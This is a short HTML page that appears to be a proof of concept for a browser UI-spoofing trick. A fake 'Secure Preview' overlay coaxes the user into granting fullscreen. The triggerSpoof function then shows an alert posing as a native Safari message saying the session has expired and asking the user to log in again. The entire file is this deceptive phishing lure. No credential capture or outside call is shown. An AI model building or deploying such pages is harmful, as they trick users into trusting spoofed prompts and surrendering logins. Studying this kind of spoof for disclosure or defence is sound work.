<!DOCTYPE html>
<html>
<head>
  <title>Secure Document Viewer</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: #fff;
      font-family: sans-serif;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      background: white;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 9999;
    }
    .fake-ui {
      border: 1px solid #ccc;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      text-align: center;
    }
    button {
      margin-top: 20px;
      padding: 10px 20px;
      font-size: 16px;
      background: #1a73e8;
      color: white;
      border: none;
      border-radius: 5px;
    }
  </style>
</head>
<body>

<div class="overlay" id="overlay">
  <div class="fake-ui">
    <h2>ðŸ”’ Secure Preview</h2>
    <p>This document requires fullscreen permission.</p>
    <button onclick="triggerSpoof()">Allow Fullscreen</button>
  </div>
</div>

<script>
function triggerSpoof() {
  document.documentElement.requestFullscreen().then(() => {
    setTimeout(() => {
      // Simulate native alert without any context shown in Safari
      alert("Your session has expired. Please login again to continue.");
    }, 600);
  });
}
</script>

</body>
</html>
